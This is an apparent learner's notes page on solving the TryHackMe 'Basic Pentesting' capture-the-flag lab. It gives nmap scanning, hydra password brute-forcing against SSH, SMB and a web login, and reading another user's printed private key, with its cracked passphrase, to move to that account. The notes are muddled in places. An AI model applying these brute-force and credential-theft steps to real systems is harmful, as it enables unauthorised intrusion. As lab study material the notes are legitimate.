<h2>Notes for the Basic pentesting CTF Tryhackme</h2>
<p>
 Using Nmap to check services:<br>
<ul><li><b>sudo nmap -T4 -A -Pn -sVC 10.10.236.7</b></li></ul>  <br>
 RESULTS:<br>
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-09 18:28 CET<br>
Nmap scan report for 10.10.236.7<br>
Host is up (0.038s latency).<br>
Not shown: 994 closed tcp ports (reset)<br>
PORT     STATE SERVICE     VERSION<br>
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)<br>
| ssh-hostkey: <br>
|   2048 db45cbbe4a8b71f8e93142aefff845e4 (RSA)<br>
|   256 09b9b91ce0bf0e1c6f7ffe8e5f201bce (ECDSA)<br>
|_  256 a5682b225f984a62213da2e2c5a9f7c2 (ED25519)<br>
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))<br>
|_http-server-header: Apache/2.4.18 (Ubuntu)<br>
|_http-title: Site doesn't have a title (text/html).<br>
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br>
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)<br>
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)<br>
| ajp-methods: <br>
|_  Supported methods: GET HEAD POST OPTIONS<br>
8080/tcp open  http        Apache Tomcat 9.0.7<br>
|_http-title: Apache Tomcat/9.0.7<br>
|_http-favicon: Apache Tomcat<br>
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).<br>
TCP/IP fingerprint:<br>
OS:SCAN(V=7.93%E=4%D=2/9%OT=22%CT=1%CU=34857%PV=Y%DS=2%DC=T%G=Y%TM=63E52D60<br>
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OPS(<br>
OS:O1=M506ST11NW6%O2=M506ST11NW6%O3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST11<br>
OS:NW6%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(<br>
OS:R=Y%DF=Y%T=40%W=6903%O=M506NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS<br>
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=<br>
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=<br>
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T<br>
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=<br>
OS:S)<br>
<br>
Network Distance: 2 hops<br>
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br>
<br>
Host script results:<br>
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s<br>
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)<br>
| smb2-time: <br>
|   date: 2023-02-09T17:28:59<br>
|_  start_date: N/A<br>
| smb2-security-mode: <br>
|   311: <br>
|_    Message signing enabled but not required<br>
| smb-security-mode: <br>
|   account_used: guest<br>
|   authentication_level: user<br>
|   challenge_response: supported<br>
|_  message_signing: disabled (dangerous, but default)<br>
| smb-os-discovery: <br>
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)<br>
|   Computer name: basic2<br>
|   NetBIOS computer name: BASIC2\x00<br>
|   Domain name: \x00<br>
|   FQDN: basic2<br>
|_  System time: 2023-02-09T12:28:59-05:00<br>
<br>
TRACEROUTE (using port 110/tcp)<br>
HOP RTT      ADDRESS<br>
1   37.64 ms 10.18.0.1<br>
2   37.70 ms 10.10.236.7<br>
<br>
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>
Nmap done: 1 IP address (1 host up) scanned in 29.78 seconds<br>
<br>
<br>
Now we want to try which directories has the web app, since there is a port 80 open with an apache tomcat:<br>
<ul><li><b>sudo hydra -L /home/wapre/Documentos/rockyou_20_12_2022.txt -P /home/wapre/Documentos/rockyou_20_12_2022.txt 10.10.236.7 smb -V -f</b></li></ul><br>
<br>
Lets see what we get with this one.<br>
RESULTS:<br>
nothing, can't get any.<br>
<br>
<br>
By guessing, we know that 'jan' is a username for the :8080, we need to try hydra to brute force the password.<br>
In the other hand we can find both user with:<br>
<ul><li><b>/opt/enum4linux/enum4linux.pl -a $IP | tee enum4linux.log</b></li></ul><br>
 <br>
<ul><li><b>sudo hydra -l jan -P /home/wapre/Documentos/rockyou_20_12_2022.txt 10.10.236.7 http-form-post "/login:username=^USER^&password=^PASS^:F=incorrect" -V</b></li></ul>
<br>
letsee what we get:<br>
nothing, we checked the answer and we don't want to brute force the HTTP, but the ssh:<br>
<ul><li><b>sudo hydra -l jan -P /home/wapre/Documentos/rockyou_20_12_2022.txt 10.10.236.7 ssh</b></li></ul>   <br>
RESULT:<br>
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br>
<br>
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-09 20:28:49<br>
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore<br>
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task<br>
[DATA] attacking ssh://10.10.236.7:22/<br>
[STATUS] 77.00 tries/min, 77 tries in 00:01h, 14344325 to do in 3104:50h, 12 active<br>
[STATUS] 70.67 tries/min, 212 tries in 00:03h, 14344190 to do in 3383:04h, 12 active<br>
[STATUS] 73.29 tries/min, 513 tries in 00:07h, 14343889 to do in 3262:06h, 12 active<br>
[22][ssh] host: 10.10.236.7   login: jan   password: armando<br>
1 of 1 target successfully completed, 1 valid password found<br>
[WARNING] Writing restore file because 4 final worker threads did not complete until end.<br>
[ERROR] 4 targets did not resolve or could not be connected<br>
[ERROR] 0 target did not complete<br><br>
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-02-09 20:39:45<br>
<br>
 we have a password: <b>armando</b>
we can enter by ssh with jan, and we saw there is another user, 'kay' with ID 1000, probably root.<br>
i just cd ../../../ , then in the /etc/passwd i find this user, since jan has no root permissions i have to try with kay<br>
 so i'm trying to bruteforce kay now:<br>
 <ul><li><b>sudo hydra -l kay -P /home/wapre/Documentos/rockyou_20_12_2022.txt 10.10.236.7 ssh<</b></li></ul><br>
 RESULTS:<br>
seems nothing...<br>
 we need to try enumeration, lets use LinPEES:<br>
 DONT KNOW HOW....<br><br><br>
 jan@basic2:~$ cd /home/kay<br>
jan@basic2:/home/kay$ ls -la<br>
total 48<br>
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .<br>
drwxr-xr-x 4 root root 4096 Apr 19  2018 ..<br>
-rw------- 1 kay  kay   756 Apr 23  2018 .bash_history<br>
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout<br>
-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc<br>
drwx------ 2 kay  kay  4096 Apr 17  2018 .cache<br>
-rw------- 1 root kay   119 Apr 23  2018 .lesshst<br>
drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano<br>
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak<br>
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile<br>
drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh<br>
-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful<br>
-rw------- 1 root kay   538 Apr 23  2018 .viminfo<br>
jan@basic2:/home/kay$ cd .ssh/<br>
jan@basic2:/home/kay/.ssh$ ls<br>
authorized_keys  id_rsa  id_rsa.pub<br>
jan@basic2:/home/kay/.ssh$ cat id.rsa<br>
cat: id.rsa: No such file or directory<br>
jan@basic2:/home/kay/.ssh$ cat id_rsa<br>
-----BEGIN RSA PRIVATE KEY-----<br>
Proc-Type: 4,ENCRYPTED<br>
DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75<br>
<br>
IoNb/J0q2Pd56EZ23oAaJxLvhuSZ1crRr4ONGUAnKcRxg3+9vn6xcujpzUDuUtlZ<br>
o9dyIEJB4wUZTueBPsmb487RdFVkTOVQrVHty1K2aLy2Lka2Cnfjz8Llv+FMadsN<br>
XRvjw/HRiGcXPY8B7nsA1eiPYrPZHIH3QOFIYlSPMYv79RC65i6frkDSvxXzbdfX<br>
AkAN+3T5FU49AEVKBJtZnLTEBw31mxjv0lLXAqIaX5QfeXMacIQOUWCHATlpVXmN<br>
lG4BaG7cVXs1AmPieflx7uN4RuB9NZS4Zp0lplbCb4UEawX0Tt+VKd6kzh+Bk0aU<br>
hWQJCdnb/U+dRasu3oxqyklKU2dPseU7rlvPAqa6y+ogK/woTbnTrkRngKqLQxMl<br>
lIWZye4yrLETfc275hzVVYh6FkLgtOfaly0bMqGIrM+eWVoXOrZPBlv8iyNTDdDE<br>
3jRjqbOGlPs01hAWKIRxUPaEr18lcZ+OlY00Vw2oNL2xKUgtQpV2jwH04yGdXbfJ<br>
LYWlXxnJJpVMhKC6a75pe4ZVxfmMt0QcK4oKO1aRGMqLFNwaPxJYV6HauUoVExN7<br>
bUpo+eLYVs5mo5tbpWDhi0NRfnGP1t6bn7Tvb77ACayGzHdLpIAqZmv/0hwRTnrb<br>
RVhY1CUf7xGNmbmzYHzNEwMppE2i8mFSaVFCJEC3cDgn5TvQUXfh6CJJRVrhdxVy<br>
VqVjsot+CzF7mbWm5nFsTPPlOnndC6JmrUEUjeIbLzBcW6bX5s+b95eFeceWMmVe<br>
B0WhqnPtDtVtg3sFdjxp0hgGXqK4bAMBnM4chFcK7RpvCRjsKyWYVEDJMYvc87Z0<br>
ysvOpVn9WnFOUdON+U4pYP6PmNU4Zd2QekNIWYEXZIZMyypuGCFdA0SARf6/kKwG<br>
oHOACCK3ihAQKKbO+SflgXBaHXb6k0ocMQAWIOxYJunPKN8bzzlQLJs1JrZXibhl<br>
VaPeV7X25NaUyu5u4bgtFhb/f8aBKbel4XlWR+4HxbotpJx6RVByEPZ/kViOq3S1<br>
GpwHSRZon320xA4hOPkcG66JDyHlS6B328uViI6Da6frYiOnA4TEjJTPO5RpcSEK<br>
QKIg65gICbpcWj1U4I9mEHZeHc0r2lyufZbnfYUr0qCVo8+mS8X75seeoNz8auQL<br>
4DI4IXITq5saCHP4y/ntmz1A3Q0FNjZXAqdFK/hTAdhMQ5diGXnNw3tbmD8wGveG<br>
VfNSaExXeZA39jOgm3VboN6cAXpz124Kj0bEwzxCBzWKi0CPHFLYuMoDeLqP/NIk<br>
oSXloJc8aZemIl5RAH5gDCLT4k67wei9j/JQ6zLUT0vSmLono1IiFdsMO4nUnyJ3<br>
z+3XTDtZoUl5NiY4JjCPLhTNNjAlqnpcOaqad7gV3RD/asml2L2kB0UT8PrTtt+S<br>
baXKPFH0dHmownGmDatJP+eMrc6S896+HAXvcvPxlKNtI7+jsNTwuPBCNtSFvo19<br>
l9+xxd55YTVo1Y8RMwjopzx7h8oRt7U+Y9N/BVtbt+XzmYLnu+3qOq4W2qOynM2P<br>
nZjVPpeh+8DBoucB5bfXsiSkNxNYsCED4lspxUE4uMS3yXBpZ/44SyY8KEzrAzaI<br>
fn2nnjwQ1U2FaJwNtMN5OIshONDEABf9Ilaq46LSGpMRahNNXwzozh+/LGFQmGjI<br>
I/zN/2KspUeW/5mqWwvFiK8QU38m7M+mli5ZX76snfJE9suva3ehHP2AeN5hWDMw<br>
X+CuDSIXPo10RDX+OmmoExMQn5xc3LVtZ1RKNqono7fA21CzuCmXI2j/LtmYwZEL<br>
OScgwNTLqpB6SfLDj5cFA5cdZLaXL1t7XDRzWggSnCt+6CxszEndyUOlri9EZ8XX<br>
oHhZ45rgACPHcdWcrKCBfOQS01hJq9nSJe2W403lJmsx/U3YLauUaVgrHkFoejnx<br>
CNpUtuhHcVQssR9cUi5it5toZ+iiDfLoyb+f82Y0wN5Tb6PTd/onVDtskIlfE731<br>
DwOy3Zfl0l1FL6ag0iVwTrPBl1GGQoXf4wMbwv9bDF0Zp/6uatViV1dHeqPD8Otj<br>
Vxfx9bkDezp2Ql2yohUeKBDu+7dYU9k5Ng0SQAk7JJeokD7/m5i8cFwq/g5VQa8r<br>
sGsOxQ5Mr3mKf1n/w6PnBWXYh7n2lL36ZNFacO1V6szMaa8/489apbbjpxhutQNu<br>
Eu/lP8xQlxmmpvPsDACMtqA1IpoVl9m+a+sTRE2EyT8hZIRMiuaaoTZIV4CHuY6Q<br>
3QP52kfZzjBt3ciN2AmYv205ENIJvrsacPi3PZRNlJsbGxmxOkVXdvPC5mR/pnIv<br>
wrrVsgJQJoTpFRShHjQ3qSoJ/r/8/D1VCVtD4UsFZ+j1y9kXKLaT/oK491zK8nwG<br>
URUvqvBhDS7cq8C5rFGJUYD79guGh3He5Y7bl+mdXKNZLMlzOnauC5bKV4i+Yuj7<br>
AGIExXRIJXlwF4G0bsl5vbydM55XlnBRyof62ucYS9ecrAr4NGMggcXfYYncxMyK<br>
AXDKwSwwwf/yHEwX8ggTESv5Ad+BxdeMoiAk8c1Yy1tzwdaMZSnOSyHXuVlB4Jn5<br>
phQL3R8OrZETsuXxfDVKrPeaOKEE1vhEVZQXVSOHGCuiDYkCA6al6WYdI9i2+uNR<br>
ogjvVVBVVZIBH+w5YJhYtrInQ7DMqAyX1YB2pmC+leRgF3yrP9a2kLAaDk9dBQcV<br>
ev6cTcfzhBhyVqml1WqwDUZtROTwfl80jo8QDlq+HE0bvCB/o2FxQKYEtgfH4/UC<br>
D5qrsHAK15DnhH4IXrIkPlA799CXrhWi7mF5Ji41F3O7iAEjwKh6Q/YjgPvgj8LG<br>
OsCP/iugxt7u+91J7qov/RBTrO7GeyX5Lc/SW1j6T6sjKEga8m9fS10h4TErePkT<br>
t/CCVLBkM22Ewao8glguHN5VtaNH0mTLnpjfNLVJCDHl0hKzi3zZmdrxhql+/WJQ<br>
4eaCAHk1hUL3eseN3ZpQWRnDGAAPxH+LgPyE8Sz1it8aPuP8gZABUFjBbEFMwNYB<br>
e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC<br>
3Jt1/ZW3XCb76R75sG5h6Q4N8gu5c/M0cdq16H9MHwpdin9OZTqO2zNxFvpuXthY<br>
-----END RSA PRIVATE KEY-----<br>
<br>
 yes, this file has a private key that we can use. This private key is stored un our 'Documentos'.<br>
 <ul><li><b>ssh -i kay_rsa kay@10.10.236.7</b><li></ul>
 but still can't enter...<br>
 DON'T KNOW HOW TO USE JOHN THE RIPPER, pw find: beeswax<br>
 normally we could enter there but i can't...<br>
 there is the answer: heresarealstrongpasswordthatfollowsthepasswordpolicy$$<br>
 
<br>
 <hr> END

 
</p>
